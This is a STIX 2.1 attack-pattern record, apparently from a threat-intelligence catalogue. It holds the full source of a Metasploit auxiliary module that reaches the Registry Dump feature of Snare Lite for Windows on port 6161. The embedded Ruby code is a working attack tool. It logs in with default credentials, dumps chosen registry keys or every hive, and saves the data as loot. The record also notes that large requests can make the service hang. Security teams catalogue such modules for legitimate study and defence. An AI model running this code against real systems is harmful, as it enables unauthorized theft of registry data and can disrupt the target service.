{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7fefc9be-fc19-4c84-9a27-34b702ca3067",
    "created": "2024-08-14T16:32:49.248405Z",
    "modified": "2024-08-14T16:32:49.248408Z",
    "name": "Snare Lite for Windows Registry Access",
    "description": " This module uses the Registry Dump feature of the Snare Lite for Windows service on 6161/TCP to retrieve the Windows registry. The Dump Registry functionality is unavailable in Snare Enterprise.  Note: The Dump Registry functionality accepts only one connected client at a time. Requesting a large key/hive will cause the service to become unresponsive until the server completes the request.  'Platform'      => 'win'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/snare_registry.rb",
            "external_id": "snare_registry.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.intersectalliance.com/wp-content/uploads/user_guides/Guide_to_Snare_for_Windows-4.2.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  HttpFingerprint = { :pattern => [ /SNARE/ ] }\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Snare Lite for Windows Registry Access',\n      'Description'   => %q{\n          This module uses the Registry Dump feature of the Snare Lite\n        for Windows service on 6161/TCP to retrieve the Windows registry.\n        The Dump Registry functionality is unavailable in Snare Enterprise.\n\n        Note: The Dump Registry functionality accepts only one connected\n        client at a time. Requesting a large key/hive will cause the service\n        to become unresponsive until the server completes the request.\n      },\n      'Platform'      => 'win',\n      'Author'        => [ 'bcoles' ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'URL', 'https://www.intersectalliance.com/wp-content/uploads/user_guides/Guide_to_Snare_for_Windows-4.2.pdf' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(6161),\n        OptString.new('HttpUsername', [ true, 'The username for Snare remote access', 'snare' ]),\n        OptString.new('HttpPassword', [ true, 'The password for Snare remote access', '' ]),\n        OptString.new('REG_DUMP_KEY', [ false, 'Retrieve this registry key and all sub-keys', 'HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System' ]),\n        OptBool.new('REG_DUMP_ALL', [false, 'Retrieve the entire Windows registry', false]),\n        OptInt.new('TIMEOUT', [true, 'Timeout in seconds for downloading each registry key/hive', 300])\n      ])\n  end\n\n  def run\n    datastore['REG_DUMP_ALL'] ? dump_all : dump_key(datastore['REG_DUMP_KEY'])\n  end\n\n  #\n  # Retrieve the supplied registry key\n  #\n  def dump_key(reg_key)\n    if reg_key.blank?\n      fail_with(Failure::BadConfig, \"#{peer} - Please supply a valid key name\")\n    end\n    hive = reg_key.split('\\\\').first\n    key = reg_key.split('\\\\')[1..-1].join('\\\\\\\\')\n    if hive !~ /\\A[A-Z0-9_]+\\z/i\n      fail_with(Failure::BadConfig, \"#{peer} - Please supply a valid key name\")\n    end\n    vars_get = { 'str_Base' => hive }\n    if key.eql?('')\n      print_status(\"#{peer} - Retrieving registry hive '#{hive}'...\")\n    else\n      print_status(\"#{peer} - Retrieving registry key '#{hive}\\\\\\\\#{key}'...\")\n      vars_get['str_SubKey'] = key\n    end\n    res = send_request_cgi({\n      'uri' => normalize_uri('RegDump'),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'vars_get' => vars_get\n    }, datastore['TIMEOUT'])\n    if !res\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    elsif res.code && res.code == 401\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    elsif res.code && res.code == 404\n      fail_with(Failure::NotVulnerable, \"#{peer} - Dump Registry feature is unavailable\")\n    elsif res.code && res.code == 200 && res.body && res.body =~ /\\AKEY: /\n      print_good(\"#{peer} - Retrieved key successfully (#{res.body.length} bytes)\")\n    elsif res.code && res.code == 200 && res.body && res.body =~ /the supplied subkey cannot be found/\n      fail_with(Failure::NotFound, \"#{peer} - The supplied registry key does not exist\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected reply (#{res.body.length} bytes)\")\n    end\n    path = store_loot(\n      'snare.registry',\n      'text/plain',\n      datastore['RHOST'],\n      res.body,\n      reg_key.gsub(/[^\\w]/, '_').downcase\n    )\n    print_good(\"File saved in: #{path}\")\n  end\n\n  #\n  # Retrieve list of registry hives\n  #\n  def retrieve_hive_list\n    hives = []\n    print_status(\"#{peer} - Retrieving list of registry hives ...\")\n    res = send_request_cgi(\n      'uri' => normalize_uri('RegDump'),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n    )\n    if !res\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    elsif res.code && res.code == 401\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    elsif res.code && res.code == 404\n      fail_with(Failure::NotVulnerable, \"#{peer} - Dump Registry feature is unavailable\")\n    elsif res.code && res.code == 200 && res.body && res.body =~ /RegDump\\?str_Base/\n      hives = res.body.scan(%r{<li><a href=\"\\/RegDump\\?str_Base=([a-zA-Z0-9_]+)\">}).flatten\n      vprint_good(\"#{peer} - Found #{hives.length} registry hives (#{hives.join(', ')})\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected reply (#{res.body.length} bytes)\")\n    end\n    hives\n  end\n\n  #\n  # Retrieve all registry hives\n  #\n  def dump_all\n    hives = retrieve_hive_list\n    if hives.blank?\n      print_error(\"#{peer} - Found no registry hives\")\n      return\n    end\n    hives.each { |hive| dump_key(hive) }\n  end\nend\n"
}